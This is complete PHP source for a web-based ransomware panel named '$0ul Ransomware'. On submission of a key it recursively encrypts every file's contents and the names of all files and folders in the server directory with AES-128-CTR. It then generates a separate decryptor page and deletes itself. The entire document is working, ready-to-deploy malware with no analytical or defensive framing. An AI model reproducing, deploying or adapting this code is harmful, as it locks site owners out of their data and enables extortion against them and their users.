<!DOCTYPE html>
<html>
<head>
   <title> $0ul Ransomware</title>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>
#box {
  width: 320px;
  height: 320px;
  border: 2px solid #000;
  display: block;
  margin-left: auto;
  margin-right: auto;
  border-radius: 5px;
  background: rgb(120,139,147);
}
#heading {
  text-align: center;
  font-size: 18px;
  color: #fff;
}
#logo {
  width: 200px;
  height: 150px;
  display: block;
  margin-left: auto;
  margin-right: auto;
  margin-bottom: 10px;
  border-radius: 10px;
}
#pwd {
  width: 200px;
  height: 25px;
  display: block;
  margin-left: auto;
  margin-right: auto;
  border: 1px solid #fff;
  outline: none;
  border-radius: 5px;
}
#btn {
  width: 150px;
  height: 35px;
  display: block;
  margin-left: auto;
  margin-right: auto;
  border: 1px solid #fff;
  outline: none;
  border-radius: 8px;  
  background: #395c65;
  color: #fff;
  margin-top: 10px ;
}
</style>
</head>
<body>
<div id="box">
<h1 id="heading">$0ul Ransomware</h1>
<img id="logo" src="https://a.top4top.io/p_2369fge260.jpg">
<form action="<?php echo pathinfo($_SERVER['SCRIPT_FILENAME'],PATHINFO_BASENAME); ?>" method="POST">
<input id="pwd" type="password" name="key" placeholder="Enter your encryption key"/>
<input id="btn" type="submit" name="submit" value="Encrypt">
</form>
</div>
<?php
//main
//Author : $0ul 
//Date : 27/6/22
function scan($path){
global $enc_key;
$cipher = "AES-128-CTR";
$iv_length = openssl_cipher_iv_length($cipher);
$option = 0;
$encryption_iv = "1234567891011121";
$files = new DirectoryIterator($path);
//looping files and folders
foreach($files as $file){
if(!$file->isDot()){
//looping folders
if(is_dir($path."/".$file)){
$org_foldername = $path."/".$file;
$enc_foldername = $path."/".base64_encode(openssl_encrypt($file,$cipher,$enc_key,$option,$encryption_iv));
rename($org_foldername,$enc_foldername);
scan($enc_foldername);
}else{
if($file->getFilename() != basename($_SERVER['REQUEST_URI'])){
$org_filename = $path."/".$file->getFilename();
$enc_filename = $path."/".base64_encode(openssl_encrypt($file,$cipher,$enc_key,$option,$encryption_iv));
$org_data = file_get_contents($org_filename);
$enc_data = base64_encode(openssl_encrypt($org_data,$cipher,$enc_key,$option,$encryption_iv));
rename($org_filename,$enc_filename);
file_put_contents($enc_filename,$enc_data);
}
}
}
}
}
if(isset($_POST["key"]) && isset($_POST["submit"])){
$enc_key = $_POST["key"];
scan(realpath("."));
$text = "CheckPoint";
$cipher = "AES-128-CTR";
$iv_length = openssl_cipher_iv_length($cipher);
$option = 0;
$encryption_iv = "1234567891011121";
$check = openssl_encrypt($text,$cipher,$enc_key,$option,$encryption_iv);
//Generate Decrypt
$f = fopen("ransomware.php","a");
fwrite($f,'<!DOCTYPE html>');
fwrite($f,'<html>');
fwrite($f,'<head>');
fwrite($f,'<title> $0ul Ransomware</title>');
fwrite($f,'<meta charset="utf-8">');
fwrite($f,'<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">');
fwrite($f,'<style>');
fwrite($f,'#box {
  width: 320px;
  height: 320px;
  border: 2px solid #000;
  display: block;
  margin-left: auto;
  margin-right: auto;
  border-radius: 5px;
  background: rgb(120,139,147);
}');
fwrite($f,'#heading {
  text-align: center;
  font-size: 18px;
  color: #fff;
}');
fwrite($f,'#logo {
  width: 200px;
  height: 150px;
  display: block;
  margin-left: auto;
  margin-right: auto;
  margin-bottom: 10px;
  border-radius: 10px;
}');
fwrite($f,'#pwd {
  width: 200px;
  height: 25px;
  display: block;
  margin-left: auto;
  margin-right: auto;
  border: 1px solid #fff;
  outline: none;
  border-radius: 5px;
}');
fwrite($f,'#btn {
  width: 150px;
  height: 35px;
  display: block;
  margin-left: auto;
  margin-right: auto;
  border: 1px solid #fff;
  outline: none;
  border-radius: 8px;  
  background: #395c65;
  color: #fff;
  margin-top: 10px ;
}');
fwrite($f,'</style>');
fwrite($f,'</head>');
fwrite($f,'<body>');
fwrite($f,'<div id="box">');
fwrite($f,'<h1 id="heading">$0ul Ransomware</h1>');
fwrite($f,'<img id="logo" src="https://a.top4top.io/p_2369fge260.jpg">');
fwrite($f,'<form action="<?php echo pathinfo($_SERVER['."'SCRIPT_FILENAME'".'],PATHINFO_BASENAME); ?>" method="POST">');
fwrite($f,'<input id="pwd" type="password" name="key" placeholder="Enter your encryption key"/>');
fwrite($f,'<input id="btn" type="submit" name="submit" value="Decrypt">');
fwrite($f,'</form>');
fwrite($f,'</div>');
fwrite($f,'<?php');
fwrite($f,"\n");
fwrite($f,'function scan($path){');
fwrite($f,'global $dec_key;');
fwrite($f,'$cipher = "AES-128-CTR";');
fwrite($f,'$iv_length = openssl_cipher_iv_length($cipher);');
fwrite($f,'$option = 0;');
fwrite($f,'$decrytion_iv = "1234567891011121";');
fwrite($f,'$files = new DirectoryIterator($path);');
fwrite($f,'foreach($files as $file){');
fwrite($f,'if(!$file->isDot()){');
fwrite($f,'if(is_dir($path."/".$file)){');
fwrite($f,'$enc_foldername = $path."/".$file;');
fwrite($f,'$org_foldername = $path."/".openssl_decrypt(base64_decode($file),$cipher,$dec_key,$option,$decrytion_iv);');
fwrite($f,'rename($enc_foldername,$org_foldername);');
fwrite($f,'scan($org_foldername);');
fwrite($f,'}else{');
fwrite($f,'if($file->getFilename() != "ransomware.php"){');
fwrite($f,'$enc_filename = $path."/".$file->getFilename();');
fwrite($f,'$org_filename = $path."/".openssl_decrypt(base64_decode($file),$cipher,$dec_key,$option,$decrytion_iv);');
fwrite($f,'$enc_data = file_get_contents($enc_filename);');
fwrite($f,'$org_data = openssl_decrypt(base64_decode($enc_data),$cipher,$dec_key,$option,$decrytion_iv);');
fwrite($f,'rename($enc_filename,$org_filename);');
fwrite($f,'file_put_contents($org_filename,$org_data);');
fwrite($f,'}');
fwrite($f,'}');
fwrite($f,'}');
fwrite($f,'}');
fwrite($f,'}');
fwrite($f,'if(isset($_POST["key"]) && isset($_POST["submit"])){');
fwrite($f,'$text = '."'$check';");
fwrite($f,'$dec_key = $_POST["key"];');
fwrite($f,'$cipher = "AES-128-CTR";');
fwrite($f,'$iv_length = openssl_cipher_iv_length($cipher);');
fwrite($f,'$option = 0;');
fwrite($f,'$decrytion_iv = "1234567891011121";');
fwrite($f,'$check = openssl_decrypt($text,$cipher,$dec_key,$option,$decrytion_iv);');
fwrite($f,'if($check == "CheckPoint"){');
fwrite($f,'scan(realpath("."));');
fwrite($f,'unlink($_SERVER["SCRIPT_FILENAME"]);');
fwrite($f,'}else{');
fwrite($f,'echo "<p style=text-align:center;color:red>Failed</p>";');
fwrite($f,'}}?>');
fwrite($f,'</body>');
fwrite($f,'</html>');
unlink($_SERVER["SCRIPT_FILENAME"]);
}
?>
</body>
</html>
